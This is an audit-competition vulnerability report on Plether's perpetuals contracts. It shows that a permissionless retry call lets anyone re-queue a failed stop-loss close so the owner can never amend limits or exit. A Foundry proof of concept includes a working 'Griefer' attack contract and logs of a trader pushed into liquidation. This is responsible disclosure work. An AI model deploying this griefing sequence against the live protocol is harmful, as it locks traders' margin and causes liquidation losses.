# \#99841 [SC-High] Anyone can re-queue a failed protection close before the owner can amend its limits, so the trader cannot exit the position

**Submitted on Nov 15th 2026 at 12:43:04 UTC by @Audittens for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99841
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)
  - Temporary freezing of funds for at least 1 hour

## Description

## Brief/Intro
When a triggered stop-loss / take-profit close fails on the trader's own close limits, the protection goes back to `Latched` and the owner is supposed to fix it with `amendLatchedPositionProtectionCloseLimits`. This function works only while the protection is `Latched` and the account has no pending orders. But `retryPositionProtectionClose` is permissionless and immediately moves the protection to `Triggered` with a new pending order that uses the same limits. An attacker can fail the live attempt and queue the next one in a single transaction, so the `Latched` state never exists between transactions. The owner's amend, cancel and ordinary close then all revert. Unless the owner itself ends the attempt, amends and retries in one transaction, the position stays open until the price returns inside the limits or the trader is liquidated. In the PoC the trader ends with 999 USDG instead of 2,918 USDG.

## Vulnerability Details
The owner's only tool after a failed protection close is:

```solidity
function amendLatchedPositionProtectionCloseLimits(uint64 protectionId, CloseFinancialLimits calldata limits) external nonReentrant {
    StoredProtection storage protection = _ownedActiveProtection(protectionId, msg.sender);
    if (protection.status != PositionProtectionTypes.PositionProtectionStatus.Latched) {
        revert OrderRouter__ProtectionNotLatched();
    }
    if (IPositionProtectionRouterHost(ROUTER).pendingOrderCounts(msg.sender) != 0) {
        revert OrderRouter__PendingOrdersExist();
    }
    _setCloseLimits(protection, limits);
    ...
}
```

The interface describes it as "Lets the owner change close limits after a failed attempt relatches, before a fresh retry".

`retryPositionProtectionClose` has no caller check, no delay and no owner priority. It only needs a `Latched` protection, the same position and zero pending orders. It queues a new close with the same stored limits and `_recordCloseAttempt` sets the status back to `Triggered`.

Ending an attempt is also permissionless. `OrderRouter.executeOrder` on an attempt that breaks the trader's limit ends with `ConstraintViolation`, and `handleFailedProtectionAttempt` sets `Latched` in the same call. After the 60 second deadline `OrderRouter.expireOrder` does the same and needs no price data.

So anyone can call `executeOrder(attempt)` and `retryPositionProtectionClose(protectionId)` in one transaction. Before the transaction the status is `Triggered`, after it the status is `Triggered` again, with a new attempt that will fail for the same reason.

While the protection is `Triggered` or `Latched` the owner has no other exit:

* `cancelPositionProtection`, `replacePositionProtection` and `cancelPositionProtectionAndCommitClose` accept only `PendingOpen` / `Armed`;
* every `commitOrder`, including a close, reverts with `OrderRouter__ProtectionActive`.

The restriction is also not needed for safety. The limits of a live attempt are pinned in the `OrderLifecycleBook` when it is queued, so changing the stored limits during a live attempt could only affect the next retry.

### Scenario
1. Alice has a LONG of 100,000 USDG notional opened at 1.00 with 5,000 USDG margin. She sets a stop-loss at 1.02 with `maxGrossAccountDebitAssets = 2,300 USDG`. At 1.02 the close would debit about 2,040 USDG, so the limit is reasonable.
2. The price gaps to 1.03 (for example at the reopen after a weekend). A keeper triggers the stop-loss and the first close attempt is queued.
3. At 1.03 the close would debit about 3,040 USDG, more than the limit, so the attempt can only fail. Alice wants to raise the limit and exit at 1.03.
4. The attacker calls `executeOrder` + `retryPositionProtectionClose` in one transaction as soon as each attempt becomes executable. Alice's amend, cancel and close calls revert every time. While the price stays at 1.03 the attacker needs no price data: for an hour it calls `expireOrder` + `retryPositionProtectionClose` when each attempt's window ends, 60 rounds.
5. The price continues to 1.049 and Alice is liquidated.

## Impact Details
The trader loses control of the position exactly when the stop-loss has fired. The margin stays locked in a position the trader wants to close, and the loss keeps growing with the price. In the PoC Alice ends with 999 USDG after liquidation instead of 2,918 USDG if she could amend and exit at 1.03, an extra loss of 1,919 USDG (38% of her margin). The loss scales with the position size and in the worst case is the whole remaining equity of the position.

Nothing in the code limits the number of rounds. In the PoC the lock lasts more than an hour before the price moves on. The attacker pays only gas and the oracle fee, one transaction per attempt, and risks no capital. Its only income is a possible liquidation bounty, so this is griefing. The precondition is that the triggered close fails on the trader's own limits, which is what happens to a stop-limit after a price gap.

An owner who knows the attack can escape by ending the live attempt, amending and retrying in one transaction; the supported smart accounts accept [`executeBatch`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps-aa/SECURITY.md#L17). That owner has to win the ordering once, while the attacker has to win it on every attempt, so this is not a permanent lock. But the owner has to know the sequence and build it by hand. The project's client builds the recovery as [one amend call](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps-aa-client/src/protection.ts#L103-L107), which always finds a pending attempt, and an owner who ends the attempt and amends in two transactions is blocked by a retry ordered between them. Against an owner who tries the escape, the attacker has to end each attempt at the first moment it can; waiting for expiry is enough only while nobody else ends the attempts. No malicious actor is even required: a keeper that simply retries after every failed attempt races the owner's amend in the same way.

The project's answer to the earlier finding about missing protection limits (Cecuro MED-9) relies on this amendment: "Tight limits may prevent execution until conditions improve or the owner amends them". This report shows that the owner can be prevented from amending.

## References
* `amendLatchedPositionProtectionCloseLimits`: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L315-L328
* `retryPositionProtectionClose`: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L382-L406
* `_recordCloseAttempt` sets `Triggered`: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L564-L578
* `handleFailedProtectionAttempt` sets `Latched`: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L637-L675
* Cancel accepts only `PendingOpen` / `Armed`: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L408-L429
* Interface comment: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/interfaces/IPositionProtectionActions.sol#L32-L37

## Proof of Concept

The following PoC runs the scenario with release risk parameters. Alice's open, the trigger, the close attempts, the retry and the liquidation go through the real router and protection book with mocked Pyth updates. It contains two tests:

* `test1_attackerRequeuesEveryAttempt_aliceCannotAmendOrExit` -- the attacker's contract fails each attempt and re-queues it in one transaction. After every cycle Alice's amend, cancel and close calls revert. The attacker then holds the lock for an hour without price data, by expiring each attempt and re-queuing it. Then the price rises and Alice is liquidated.
* `test2_withoutAttacker_aliceAmendsAndExits` -- the attempt fails once, Alice amends the limit and the retried close executes at 1.03.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderRouter} from "@plether/perps/OrderRouter.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";
import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
import {IPositionProtectionViews} from "@plether/perps/interfaces/IPositionProtectionViews.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {console} from "forge-std/console.sol";

/// Ends the live protection attempt (it fails on the trader's limit) and queues the next one in the same transaction.
contract Griefer {

    function executeAndRetry(
        OrderRouter router,
        IPositionProtectionActions protection,
        uint64 orderId,
        uint64 protectionId,
        bytes[] calldata pythUpdateData
    ) external returns (uint64 nextOrderId) {
        router.executeOrder(orderId, pythUpdateData);
        nextOrderId = protection.retryPositionProtectionClose(protectionId);
    }

    /// The same without any price data, once the attempt's 60 second window has ended.
    function expireAndRetry(
        OrderRouter router,
        IPositionProtectionActions protection,
        uint64 orderId,
        uint64 protectionId
    ) external returns (uint64 nextOrderId) {
        router.expireOrder(orderId);
        nextOrderId = protection.retryPositionProtectionClose(protectionId);
    }

}

contract PoC_ProtectionRetryBlocksAmend is BasePerpTest {

    IPositionProtectionActions protection;
    IPositionProtectionViews protectionViews;
    Griefer griefer;

    address alice = makeAddr("alice");
    address keeper = makeAddr("keeper");
    address attacker = makeAddr("attacker");

    uint256 constant SIZE = 100_000e18; // 100,000 USDG notional at 1.00
    uint256 constant STOP_LOSS = 1.02e8;
    uint256 constant GAP_PRICE = 1.03e8;

    // Release parameters from packages/perps/DEPLOYMENT.md.
    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function setUp() public override {
        super.setUp();
        protection = IPositionProtectionActions(address(router.positionProtectionBook()));
        protectionViews = IPositionProtectionViews(address(router.positionProtectionBook()));
        griefer = new Griefer();
        _fundTrader(alice, 6000e6);
    }

    function test1_attackerRequeuesEveryAttempt_aliceCannotAmendOrExit() public {
        (uint64 protectionId, uint64 orderId) = _openProtectAndTrigger();

        // The attacker fails the live attempt and re-queues it in one transaction, again and again.
        for (uint256 i = 0; i < 3; i++) {
            bytes[] memory update = _mockPythUpdateData(GAP_PRICE);
            vm.prank(attacker);
            orderId = griefer.executeAndRetry(router, protection, orderId, protectionId, update);
            console.log("Attempt failed and re-queued, new order id: %s", orderId);

            // Between the attacker's transactions the protection is never Latched, so Alice has no way out.
            _aliceCannotExit(protectionId);
        }

        // With no price data at all, the attacker then keeps the lock for an hour: it expires each attempt when
        // its 60 second window ends and re-queues it in the same transaction.
        uint256 lockStart = vm.getBlockTimestamp();
        uint256 expiryRounds;
        while (vm.getBlockTimestamp() < lockStart + 1 hours) {
            vm.warp(router.lifecycleBook().orderTiming(orderId).executionDeadline + 1);
            vm.roll(vm.getBlockNumber() + 1);
            vm.prank(attacker);
            orderId = griefer.expireAndRetry(router, protection, orderId, protectionId);
            expiryRounds++;
        }
        _aliceCannotExit(protectionId);
        console.log(
            "Lock held for %s more minutes by %s expiry rounds", (vm.getBlockTimestamp() - lockStart) / 60, expiryRounds
        );

        // The price keeps rising and Alice is liquidated.
        _mockPythUpdateData(1.049e8);
        bytes[] memory liquidationData = _livePriceData(1.049e8);
        vm.prank(attacker);
        router.executeLiquidation(alice, liquidationData);
        (uint256 size,,,,,,) = engine.positions(alice);
        assertEq(size, 0, "Alice is liquidated");

        console.log("Alice's balance at the end: %s", clearinghouse.balanceAssets(alice) / 1e6);
    }

    function test2_withoutAttacker_aliceAmendsAndExits() public {
        (uint64 protectionId, uint64 orderId) = _openProtectAndTrigger();

        // A keeper executes the attempt. It fails on Alice's limit and the protection becomes Latched.
        bytes[] memory update = _mockPythUpdateData(GAP_PRICE);
        vm.prank(keeper);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(orderId, update);
        assertEq(uint8(result.terminalReason), uint8(OrderV3Types.TerminalReason.ConstraintViolation));
        assertEq(uint8(_status(protectionId)), uint8(PositionProtectionTypes.PositionProtectionStatus.Latched));

        // Alice raises her limit, the close is retried and executes at 1.03.
        vm.prank(alice);
        protection.amendLatchedPositionProtectionCloseLimits(protectionId, _limits(type(uint256).max));
        vm.prank(keeper);
        orderId = protection.retryPositionProtectionClose(protectionId);
        update = _mockPythUpdateData(GAP_PRICE);
        vm.prank(keeper);
        result = router.executeOrder(orderId, update);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed));

        console.log("Alice's balance at the end: %s", clearinghouse.balanceAssets(alice) / 1e6);
    }

    /// Alice opens LONG 100,000 at 1.00 with 5,000 USDG margin and a stop-loss at 1.02 that may debit at most
    /// 2,300 USDG. The price gaps to 1.03, a keeper triggers the stop-loss and the first close attempt is queued.
    function _openProtectAndTrigger() internal returns (uint64 protectionId, uint64 orderId) {
        _openLong(alice, SIZE, 5000e6, 1e8);
        _refreshMark(1e8);

        PositionProtectionTypes.PositionProtectionParams memory params;
        params.stopLossTriggerPrice = STOP_LOSS;
        params.closeLimits = _limits(2300e6);
        vm.prank(alice);
        protectionId = protection.createPositionProtection(params);

        _mockPythUpdateData(GAP_PRICE);
        bytes[] memory triggerData = _livePriceData(GAP_PRICE);
        vm.prank(keeper);
        orderId = protection.triggerPositionProtection(protectionId, triggerData);
    }

    /// A V3 order request with no limits, as an account would send to `OrderRouter.commitOrder`.
    function _request(
        uint256 size,
        uint256 margin,
        bool isClose
    ) internal view returns (OrderV3Types.OrderRequest memory) {
        uint256 window = router.maxExecutionWindowSeconds();
        return OrderV3Types.OrderRequest({
            clientOrderId: keccak256(abi.encode("poc", router.nextCommitId())),
            side: CfdTypes.Side.LONG,
            sizeDelta: size,
            marginDelta: margin,
            targetPrice: isClose ? type(uint256).max : 1,
            isClose: isClose,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(vm.getBlockTimestamp() + window),
                executionWindowSeconds: uint32(window),
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
    }

    /// The account commits a LONG open through `OrderRouter.commitOrder` and the keeper executes it through
    /// `OrderRouter.executeOrder` at `price`. Only the Pyth update is mocked.
    function _openLong(
        address account,
        uint256 size,
        uint256 margin,
        uint256 price
    ) internal {
        OrderV3Types.OrderRequest memory request = _request(size, margin, false);
        vm.prank(account);
        uint64 orderId = router.commitOrder(request);
        bytes[] memory priceData = _mockPythUpdateData(price);
        vm.prank(keeper);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(orderId, priceData);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "order executes");
    }

    /// Alice's amend, both cancel calls and an ordinary close all revert while an attempt is pending.
    function _aliceCannotExit(
        uint64 protectionId
    ) internal {
        assertEq(uint8(_status(protectionId)), uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered));
        OrderV3Types.OrderRequest memory closeRequest = _request(SIZE, 0, true);
        vm.startPrank(alice);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
        protection.amendLatchedPositionProtectionCloseLimits(protectionId, _limits(type(uint256).max));
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        protection.cancelPositionProtection(protectionId);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        protection.cancelPositionProtectionAndCommitClose(protectionId, closeRequest);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionActive.selector);
        router.commitOrder(closeRequest);
        vm.stopPrank();
    }

    function _limits(
        uint256 maxGrossAccountDebitAssets
    ) internal pure returns (PositionProtectionTypes.CloseFinancialLimits memory) {
        return PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: maxGrossAccountDebitAssets,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max
        });
    }

    function _status(
        uint64 protectionId
    ) internal view returns (PositionProtectionTypes.PositionProtectionStatus) {
        return protectionViews.getPositionProtection(protectionId).status;
    }

    function _refreshMark(
        uint256 price
    ) internal {
        if (block.timestamp <= engine.lastMarkTime()) {
            vm.warp(uint256(engine.lastMarkTime()) + 1);
        }
        router.updateMarkPrice(_livePriceData(price));
    }

    /// Mock Pyth payload with the current price of every feed (Pyth is out of scope).
    function _livePriceData(
        uint256 price
    ) internal view returns (bytes[] memory updateData) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](ids.length);
        uint256 previous = engine.lastMarkTime();
        for (uint256 i; i < ids.length; ++i) {
            ticks[i] =
                MockPyth.FeedUpdate(ids[i], MockPyth.MockPrice(int64(uint64(price)), 0, -8, block.timestamp, previous));
        }
        updateData = new bytes[](1);
        updateData[0] = abi.encode(ticks);
    }

}
```

Save this code to the file `packages/perps/test/perps/poc/PoC_ProtectionRetryBlocksAmend.t.sol` and run `forge test --root packages/perps --mc PoC_ProtectionRetryBlocksAmend -vv`. It will print the following logs (balances are in whole USDG):

```
Ran 2 tests for test/perps/poc/PoC_ProtectionRetryBlocksAmend.t.sol:PoC_ProtectionRetryBlocksAmend
[PASS] test1_attackerRequeuesEveryAttempt_aliceCannotAmendOrExit() (gas: 52923476)
Logs:
  Attempt failed and re-queued, new order id: 3
  Attempt failed and re-queued, new order id: 4
  Attempt failed and re-queued, new order id: 5
  Lock held for 61 more minutes by 60 expiry rounds
  Alice's balance at the end: 999

[PASS] test2_withoutAttacker_aliceAmendsAndExits() (gas: 5646152)
Logs:
  Alice's balance at the end: 2918

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 117.63ms (108.71ms CPU time)
```

Alice started with 6,000 USDG. When she can amend the limit she exits at 1.03 with 2,918 USDG. When the attacker re-queues every attempt she cannot change anything and ends with 999 USDG after liquidation.
